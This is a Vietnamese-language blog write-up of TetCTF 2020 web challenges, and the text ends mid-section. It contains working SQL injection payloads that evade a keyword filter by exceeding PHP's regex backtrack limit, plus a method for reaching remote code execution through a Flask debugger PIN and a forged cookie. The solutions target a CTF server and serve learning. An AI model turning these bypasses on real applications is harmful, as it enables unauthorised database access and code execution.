<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TetCTF 2020 - Web</title>
    <meta name="description" content="Writeup for all the Web challenges in TetCTF 2020">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="preconnect" href="/" crossorigin>
    <link rel="stylesheet" href="/css/index.css">
    <link rel="stylesheet" href="/css/prism-tomorrow.css">
    <link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="son&#39;s blog">
    <link rel="alternate" href="/feed/feed.json" type="application/json" title="son&#39;s blog">
  </head>
  <body>
    <header>
      <h1 class="home"><a href="/">son&#39;s blog</a></h1>
      <ul class="nav">
        <li class="nav-item"><a href="/">Home</a></li>
        <li class="nav-item"><a href="/posts/">Posts</a></li>
      </ul>
    </header>

    <main class="tmpl-post">
      <h1>TetCTF 2020 - Web</h1>

<h2 id="wysinwyg">WYSINWYG <a class="direct-link" href="#wysinwyg">#</a></h2>
<pre><code>What you see is not what you get... Do you see the flag? then you don't get the flag.
</code></pre>
<p>Tác giả cho ta một đoạn code PHP ngắn:</p>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><br><span class="highlight-line"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'secret.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line">    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a⁡'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b⁦'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><mark class="highlight-line highlight-line-active">                <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a⁡'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></mark><br><span class="highlight-line">                <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b⁦'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token punctuation">}</span></span><br><span class="highlight-line">            <span class="token punctuation">}</span></span><br><span class="highlight-line">        <span class="token punctuation">}</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span></span><br><span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
<p>Bài này tác giả chèn 2 kí tự <a href="https://en.wikipedia.org/wiki/Zero-width_space">zero-width space</a> vào sau <code>a</code> và <code>b</code> ở dòng 12.</p>
<p>PoC:</p>
<pre><code>/?a=1&amp;b=1&amp;a%E2%81%A1=1&amp;b%E2%81%A6=0
</code></pre>
<h2 id="secure-system">Secure System <a class="direct-link" href="#secure-system">#</a></h2>
<pre><code>I created a security checker, can you help audit the source?
Source: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view
</code></pre>
<p>Source code chỉ có 1 file index.php như sau:</p>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'dbconnect.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"SELECT * FROM xxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'yyyyyyyyyyyyyyyyyyyy'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//Sorry It's our secret, can't share</span></span><br><span class="token delimiter important">?></span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><br><span class="highlight-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><br><span class="highlight-line">    Security Check!!! Please enter your ID to prove who are you !!!:</span><br><span class="highlight-line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><br><span class="highlight-line">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><br><span class="highlight-line">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><br><span class="highlight-line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><br><span class="highlight-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><br><span class="highlight-line"></span><br><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/and|or|in|if|case|sleep|benchmark/is'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Tet nhat ai lai hack nhau :(, very dangerous key word'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/order.+?by|union.+?select/is'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Tet nhat ai lai hack nhau :(, very dangerous statement'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"SELECT * FROM users WHERE id="</span> <span class="token punctuation">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Hello '</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'This can\'t be =]] Just put here for fun lul'</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token punctuation">}</span></span><br><span class="highlight-line">        <span class="token punctuation">}</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span></span><br><span class="highlight-line"><span class="token punctuation">}</span></span><br><span class="token delimiter important">?></span></span></code></pre>
<p>Dòng 4 chúng ta có 1 hint của tác giả là phải sử dụng SQL Injection và leak được flag ở 1 column Y và table X nào đó mà chúng ta chưa biết trong database.</p>
<p>Chúng ta bị chặn sử dụng câu lệnh <code>order by</code> và <code>union select</code>, đặc biệt lưu ý là cụm <code>in</code> cũng bị chặn, điều này dẫn đến sẽ có đôi chút khó khăn để ta lấy được table name và column name từ <code>information_schema</code> cũng như các database có prefix <code>innodb</code>.</p>
<p>Nhưng chúng ta có thể bypass <code>preg_match</code> ở dòng 21 bằng cách làm cho PCRE (Engine xử lí Regular Expression trong PHP) xử lí input của ta, làm cho vượt quá backtrack limit mặc định <a href="https://www.php.net/manual/en/pcre.configuration.php">của</a> <a href="https://stackoverflow.com/a/40426462">PHP</a>. Bằng cách này, chúng ta có thể sử dụng <code>order by</code> hay <code>union select</code> dễ dàng.</p>
<h3 id="get-table-name">Get table name <a class="direct-link" href="#get-table-name">#</a></h3>
<p>Mình quyết định sử dụng view <code>x$ps_schema_table_statistics_io</code> có trong database <code>sys</code> vì theo như <a href="https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html">MySQL documentation</a> mô tả:</p>
<pre><code>These views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first).
</code></pre>
<p>và trong view này cũng có chứa 2 columns là <code>table_schema</code> và <code>table_name</code>.</p>
<pre class="language-python"><code class="language-python"><span class="highlight-line">res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://45.77.240.178:8002/index.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">'5 union/*'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">1000000</span> <span class="token operator">+</span> <span class="token string">'*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()'</span></span><br><span class="highlight-line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span></code></pre>
<p><img src="https://i.imgur.com/xKdXXBS.jpg" alt=""></p>
<p>Table name: <code>Th1z_Fack1n_Fl4444g_Tabl3</code></p>
<h3 id="get-flag-without-knowing-column-name">Get flag without knowing column name <a class="direct-link" href="#get-flag-without-knowing-column-name">#</a></h3>
<p>Cách này đã được anh @tsug0d mô tả cực kì chi tiết và dễ hiểu trong <a href="https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/">blog</a> của anh nên mình không dài dòng nữa. Get flag thôi!</p>
<pre class="language-python"><code class="language-python"><span class="highlight-line">res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://45.77.240.178:8002/index.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">'5 union/*'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">1000000</span> <span class="token operator">+</span> <span class="token string">'*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x'</span></span><br><span class="highlight-line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span></code></pre>
<p><img src="https://i.imgur.com/iAgHzHz.jpg" alt=""></p>
<h3 id="another-way-from-the-author">Another way from the author <a class="direct-link" href="#another-way-from-the-author">#</a></h3>
<p><img src="https://i.imgur.com/PVK8WBT.jpg" alt=""><br>
🎉🎉🎉</p>
<h2 id="the-prophet">The Prophet <a class="direct-link" href="#the-prophet">#</a></h2>
<pre><code>Wohoo, wanna hear some oracle?
</code></pre>
<p>Bài này chỉ có 1 chức năng cơ bản là đọc các file text có tên từ 1 - 5. Khi ta thử file <code>6.txt</code>, trang xuất hiện giao diện thông báo lỗi của Flask, chứng tỏ debug mode đang được enabled.<br>
Trong giao diện báo lỗi, chúng ta có thể đọc 1 phần source code đã bị disclosed:</p>
<p><img src="https://i.imgur.com/WvzEivs.jpg" alt=""></p>
<p>Ta dễ dàng thấy được lỗi Local File Inclusion (LFI) trong đoạn code xử lí đọc file này. Biến <code>filename</code> được truyền thẳng đến hàm <code>open()</code> và nội dung được đưa ra ngoài thông qua hàm <code>render_template()</code>.</p>
<p>Ngay lúc này, mình nhận ra rằng việc chúng ta có lỗi LFI sẽ dẫn đến việc có thể <a href="https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">generate</a> được debugger PIN code, sau đó sử dụng chức năng Interactive shell được tích hợp trong giao diện lỗi của Flask để có thể leverage lên RCE.</p>
<p>Sau khi làm theo bài hướng dẫn generate PIN code và đã có được PIN, giờ chỉ việc submit PIN và RCE thôi, nhưng đời không như mơ và cuộc sống không dễ thở...</p>
<p><img src="https://i.imgur.com/lP07KrD.jpg" alt=""></p>
<p>Ok, tự trong đầu nghĩ chắc đây cũng là ý của tác giả thôi, chắc có chỗ nào đâu đó trong phần xử lí nhập PIN này có thể vượt được, let check it out. 🧐</p>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token comment"># https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py</span></span><br><span class="highlight-line"><span class="token comment"># ...</span></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>pin<span class="token punctuation">,</span> text_type<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">        pin <span class="token operator">=</span> pin<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>pin <span class="token operator">+</span> <span class="token string">b"shittysalt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span></span><br><span class="highlight-line"><span class="token comment"># ...</span></span><br><span class="highlight-line"><span class="token keyword">class</span> <span class="token class-name">DebuggedApplication</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token comment"># ...</span></span><br><span class="highlight-line">    <span class="token keyword">def</span> <span class="token function">check_pin_trust</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br>        <span class="token triple-quoted-string string">"""Checks if the request passed the pin test.  This returns `True` if the<br><span class="highlight-line">        request is trusted on a pin/cookie basis and returns `False` if not.</span><br><span class="highlight-line">        Additionally if the cookie's stored pin hash is wrong it will return</span><br><span class="highlight-line">        `None` so that appropriate action can be taken.</span><br>        """</span><br><span class="highlight-line">        <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span><br><span class="highlight-line">            <span class="token keyword">return</span> <span class="token boolean">True</span></span><br><span class="highlight-line">        val <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> <span class="token keyword">not</span> val <span class="token keyword">or</span> <span class="token string">"|"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> val<span class="token punctuation">:</span></span><br><span class="highlight-line">            <span class="token keyword">return</span> <span class="token boolean">False</span></span><br><span class="highlight-line">        ts<span class="token punctuation">,</span> pin_hash <span class="token operator">=</span> val<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> <span class="token keyword">not</span> ts<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">            <span class="token keyword">return</span> <span class="token boolean">False</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> pin_hash <span class="token operator">!=</span> hash_pin<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">            <span class="token keyword">return</span> <span class="token boolean">None</span></span><br><span class="highlight-line">        <span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> PIN_TIME<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">    <span class="token keyword">def</span> <span class="token function">pin_auth</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">        <span class="token triple-quoted-string string">"""Authenticates with the pin."""</span></span><br><span class="highlight-line">        exhausted <span class="token operator">=</span> <span class="token boolean">False</span></span><br><span class="highlight-line">        auth <span class="token operator">=</span> <span class="token boolean">False</span></span><br><span class="highlight-line">        trust <span class="token operator">=</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">        <span class="token comment"># If the trust return value is `None` it means that the cookie is</span></span><br><span class="highlight-line">        <span class="token comment"># set but the stored pin hash value is bad.  This means that the</span></span><br><span class="highlight-line">        <span class="token comment"># pin was changed.  In this case we count a bad auth and unset the</span></span><br><span class="highlight-line">        <span class="token comment"># cookie.  This way it becomes harder to guess the cookie name</span></span><br><span class="highlight-line">        <span class="token comment"># instead of the pin as we still count up failures.</span></span><br><span class="highlight-line">        bad_cookie <span class="token operator">=</span> <span class="token boolean">False</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> trust <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span><br><span class="highlight-line">            self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span></span><br><span class="highlight-line">            bad_cookie <span class="token operator">=</span> <span class="token boolean">True</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">        <span class="token comment"># If we're trusted, we're authenticated.</span></span><br><span class="highlight-line">        <span class="token keyword">elif</span> trust<span class="token punctuation">:</span></span><br><span class="highlight-line">            auth <span class="token operator">=</span> <span class="token boolean">True</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">        <span class="token comment"># If we failed too many times, then we're locked out.</span></span><br><mark class="highlight-line highlight-line-active">        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span></mark><br><mark class="highlight-line highlight-line-active">            exhausted <span class="token operator">=</span> <span class="token boolean">True</span></mark><br><span class="highlight-line"></span><br><span class="highlight-line">        <span class="token comment"># Otherwise go through pin based authentication</span></span><br><span class="highlight-line">        <span class="token keyword">else</span><span class="token punctuation">:</span></span><br><span class="highlight-line">            entered_pin <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"pin"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">            <span class="token keyword">if</span> entered_pin<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">                self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">=</span> <span class="token number">0</span></span><br><span class="highlight-line">                auth <span class="token operator">=</span> <span class="token boolean">True</span></span><br><span class="highlight-line">            <span class="token keyword">else</span><span class="token punctuation">:</span></span><br><span class="highlight-line">                self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">        rv <span class="token operator">=</span> Response<span class="token punctuation">(</span></span><br><span class="highlight-line">            json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"auth"</span><span class="token punctuation">:</span> auth<span class="token punctuation">,</span> <span class="token string">"exhausted"</span><span class="token punctuation">:</span> exhausted<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span><br><span class="highlight-line">            mimetype<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token punctuation">)</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> auth<span class="token punctuation">:</span></span><br><span class="highlight-line">            rv<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span></span><br><span class="highlight-line">                self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">,</span></span><br><span class="highlight-line">                <span class="token string">"%s|%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> hash_pin<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span><br><span class="highlight-line">                httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span></span><br><span class="highlight-line">            <span class="token punctuation">)</span></span><br><span class="highlight-line">        <span class="token keyword">elif</span> bad_cookie<span class="token punctuation">:</span></span><br><span class="highlight-line">            rv<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span></span><br><span class="highlight-line">        <span class="token keyword">return</span> rv</span><br><span class="highlight-line">    <span class="token comment"># ...</span></span></code></pre>
<p>Hai dòng được highlight là câu lệnh if kiểm tra điều kiện nếu nhập sai quá 10 lần thì <code>exhausted = True</code>, từ đó ta suy ra đã có người submit sai PIN khoảng 7 - 8 lần trước đó, để đến lượt mình thì sau khi thử 2 - 3 mã PIN thì nó lên 10. 😤</p>
<p>Ok, quay lại nào. Vì câu điều kiện check nhập sai nằm trong nhánh <code>elif</code> nên chỉ cần 2 câu điều kiện ở trên đúng thì sẽ không thực thi. Biến <code>trust</code> được khởi tạo với value là return value của hàm <code>check_pin_trust()</code>, hàm này thực hiện get và parse cookie, kiểm tra PIN hash trong cookie có đúng với PIN hash trên server hay không, PIN expired time có hết hạn hay chưa.</p>
<p>Vì chúng ta có thể control được cookie nên ta có thể tùy biến được cookie để vượt qua được việc check exhausted. Mình đã có quyền chạy Python code trên interactive shell rồi, tìm và đọc flag rất dễ dàng.</p>
<h3 id="author-n%C3%B3i-g%C3%AC%3F">Author nói gì? <a class="direct-link" href="#author-n%C3%B3i-g%C3%AC%3F">#</a></h3>
<p>Ok, giải xong inbox author thì ảnh bảo chỉ cần generate PIN code là xong rồi RCE lấy flag thôi, tại lúc đó setup có vấn đề nên mới bị exhausted. 😤</p>
<h2 id="meepwntube2050">MeePwnTube2050 <a class="direct-link" href="#meepwntube2050">#</a></h2>
<p><img src="https://i.imgur.com/PtWQV2F.jpg" alt=""></p>
<pre><code>Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view
</code></pre>
<p>Bài này mình stuck đến ngày hôm sau mới nghĩ được hướng 😅</p>
<p>Vì mình ngâm đi ngâm lại source code nhiều lần để chắc chắn rằng không có 1 lỗi nào có thể xảy ra, và đến khi mình chợt để ý 1 chi tiết nhỏ trong search.php:</p>
